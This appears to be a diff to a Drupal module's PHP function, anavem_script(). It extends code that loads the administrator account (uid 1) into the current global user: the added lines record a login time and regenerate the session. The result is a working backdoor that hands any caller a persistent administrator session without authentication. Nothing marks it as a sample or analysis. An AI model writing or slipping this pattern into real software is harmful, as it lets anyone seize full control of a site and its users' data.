@@ -64,6 +64,12 @@ function anavem_script() {
   global $user;
   $luser = user_load(1);
   $user = $luser;
+  $user->login = time();
+  db_update('users')
+  ->fields(array('login' => $user->login))
+  ->condition('uid', $user->uid)
+  ->execute();
+  drupal_session_regenerate();
   return 'Welcome';
 }
 
